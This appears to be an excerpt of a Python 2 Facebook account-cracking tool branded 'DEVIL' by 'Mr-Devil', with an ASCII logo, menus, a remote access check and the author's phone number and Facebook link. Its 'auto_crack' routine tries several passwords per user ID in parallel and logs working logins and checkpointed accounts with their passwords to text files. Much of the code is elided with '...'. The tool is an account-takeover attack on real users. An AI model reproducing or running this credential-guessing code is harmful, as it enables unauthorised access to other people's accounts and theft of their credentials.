...
#### LOGO ####
logo = """                          
\033[1;94m'______ _____ _   _ _____ _
\033[1;91m|  _  \  ___| | | |_   _| |
\033[1;92m| | | | |__ | | | | | | | |
\033[1;93m| | | |  __|| | | | | | | |
\033[1;95m| |/ /| |___\ \_/ /_| |_| |____
\033[1;97m|___/ \____/ \___/ \___/\_____/
\033[1;94m________  _______________   ____.___.____ 
\033[1;96m________  _______________   ____.___.____ 
	
	
clear= """
print("""\033[1;97m  L E G E N D -- WHITE .X. DEVIL. \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;94m➤\033[1;97m Author : Mr-Devil
\033[1;92m➤\033[1;97m Github : Devil-XD
\033[1;93m➤\033[1;97m Note : Use Fast 4g Internet
\033[1;95m➤\033[1;97m Whatsapp : 03444343014
\033[1;97m  --------------------------------------------------""")   
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Devil-XD/DEVIL/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923444343014')
        reg()
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow Mr DEVIL On Fb'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─Mr-DEVIL➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://www.facebook.com/allandino.rajo.3/')
    else:
        print ''
...
def log_fb():
    ...
    try:
        ...
        if 'loc' in q:
            ...
            ts.close()
            menu()
        elif 'www.facebook.com' in q['DEVIL']:
...
def menu():
    ...
    print '\033[1;92m[2] Follow Mr Devil'
...
def menu_s():
    ms = raw_input('\033[1;97m╰─Mr-Devil➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://www.facebook.com/allandino.rajo.3/')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Mr-Devil➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[DEVIL-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['DEVIL']:
                print '\033[1;97m[DEVIL-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[DEVIL-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['DEVIL']:
                    print '\033[1;97m[DEVIL-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('DEVIL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[DEVIL-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['DEVIL']:
                        print '\033[1;97m[DEVIL-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('DEVIL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[DEVIL-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['DEVIL']:
                            print '\033[1;97m[DEVIL-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('DEVIL_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mBAAKI NAAME TO SONAA HOGA [DEVIL]'
